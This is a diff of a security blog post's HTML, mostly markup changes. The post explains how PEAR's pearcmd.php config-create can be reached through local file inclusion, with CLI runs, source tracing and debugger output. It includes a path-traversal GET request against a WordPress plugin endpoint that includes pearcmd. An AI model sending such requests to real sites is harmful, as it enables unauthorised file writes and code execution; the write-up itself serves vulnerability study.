+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php
-</span></span><span class="line"><span class="cl">Root directory must be an absolute path beginning with <span class="s2">&#34;/&#34;</span>, was: <span class="s2">&#34;test_root_path&#34;</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Root directory must be an absolute path beginning with <span class="s2">&#34;/&#34;</span>, was: <span class="s2">&#34;test_root_path&#34;</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Here PEAR insists <code>test_root_path</code> must be an absolute path starting with <code>/</code>.</p>
 <p>Running again with a valid path:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The returned output:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-text"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -433,19 +433,19 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">maintainers)
 </span></span><span class="line hl"><span class="cl">User Configuration File        Filename         /var/www/html/test_filename.php
 </span></span><span class="line"><span class="cl">System Configuration File      Filename         #no#system#config#
-</span></span><span class="line hl"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table>
+</span></span><span class="line hl"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>The result shows child paths for each type of data being auto-generated under <code>/test_root_path/pear</code>. On the last line:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The configuration file was created in the current working directory, not under <code>root_path</code>. This is PEAR&rsquo;s default behavior: <code>root_path</code> only affects the layout of install directories, not the location of the saved config file.</p>
 <p>When accessing the file <code>&quot;/var/www/html/test_filename.php&quot;</code> via a browser:</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" title="Contents of test_filename.php rendered in the browser" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" data-sub-html="<h2>file-create</h2><p>Contents of test_filename.php rendered in the browser</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png' alt="file-create" height="137" width="1919"></a><figcaption class="image-caption">Contents of test_filename.php rendered in the browser</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" title="Contents of test_filename.php rendered in the browser" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" data-sub-html="<h2>file-create</h2><p>Contents of test_filename.php rendered in the browser</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png' alt="file-create" height="137" width="1919"></a><figcaption class="image-caption">Contents of test_filename.php rendered in the browser</figcaption>
   </figure></p>
 <p>The created file contains information about <code>test_root_path</code>, presented in <code>serialize</code> format.</p>
 <p>However, that was the CLI execution path. For web exploitation, one must analyze the source to see how the program accepts and processes parameters passed in.</p>
@@ -453,17 +453,17 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
   <a href="#pearcmd-code-analysis" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Before analyzing <code>/usr/local/lib/php/pearcmd.php</code>, it&rsquo;s useful to set up a debugging environment to observe execution flow — see: <a href="https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/</a></p>
+</h2><p>Before analyzing <code>/usr/local/lib/php/pearcmd.php</code>, it&rsquo;s useful to set up a debugging environment to observe execution flow — see: <a href="https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/</a></p>
 <p>Then copy all PHP source from the container to a local machine, preserving directory structure, so when the debugger stops at <code>/usr/local/lib/php/pearcmd.php</code> you can open and inspect the corresponding file from the container:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/</span></span></code></pre></td></tr></table></div>
 </div>
-</div><div class="highlight" title="/usr/local/lib/php/pearcmd.php"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true" title="/usr/local/lib/php/pearcmd.php"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">/usr/local/lib/php/pearcmd.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -527,18 +527,18 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="o">...</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>First, all commands are loaded into <code>$all_commands</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">/usr/local/lib/php/PEAR/Command.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -554,21 +554,21 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">        <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">registerCommands</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_PEAR_Command_commandlist&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>getCommands()</code> calls <code>registerCommands()</code> to register the commands.</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" title="All commands are loaded into `$all_commands`" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" data-sub-html="<h2>all_commands</h2><p>All commands are loaded into `$all_commands`</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png' alt="all\_commands" height="390" width="362"></a><figcaption class="image-caption">All commands are loaded into `$all_commands`</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" title="All commands are loaded into `$all_commands`" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" data-sub-html="<h2>all_commands</h2><p>All commands are loaded into `$all_commands`</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png' alt="all\_commands" height="390" width="362"></a><figcaption class="image-caption">All commands are loaded into `$all_commands`</figcaption>
   </figure></p>
 <p>Then <code>$argv</code> is initialized:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><div class="highlight" title="php/Console/Getopt.php"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true" title="php/Console/Getopt.php"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">php/Console/Getopt.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -600,54 +600,54 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>If <code>$argv</code> is not an array (i.e., no valid data), the function tries to find the equivalent in <code>$_SERVER['argv']</code> and return it — that is, the <code>search-word</code> parts we pass in the URL. Example:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Observed in the debugger:</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" title="Value of `$argv` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" data-sub-html="<h2>argv1</h2><p>Value of `$argv` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png' alt="argv1" height="156" width="1634"></a><figcaption class="image-caption">Value of `$argv` in the debugger</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" title="Value of `$argv` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" data-sub-html="<h2>argv1</h2><p>Value of `$argv` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png' alt="argv1" height="156" width="1634"></a><figcaption class="image-caption">Value of `$argv` in the debugger</figcaption>
   </figure></p>
 <p>Next <code>$argv</code> has its first element removed and is passed to <code>Console_Getopt::getopt2()</code>, the return value assigned to <code>$options</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">array_shift</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The value is now:</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" title="Values of `$argv` and `$options` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" data-sub-html="<h2>argv_options</h2><p>Values of `$argv` and `$options` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png' alt="argv\_options" height="244" width="1634"></a><figcaption class="image-caption">Values of `$argv` and `$options` in the debugger</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" title="Values of `$argv` and `$options` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" data-sub-html="<h2>argv_options</h2><p>Values of `$argv` and `$options` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png' alt="argv\_options" height="244" width="1634"></a><figcaption class="image-caption">Values of `$argv` and `$options` in the debugger</figcaption>
   </figure></p>
 <p>The <code>$command</code> variable is initialized from <code>$options[1][0]</code>, in this case <code>config-create</code>.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
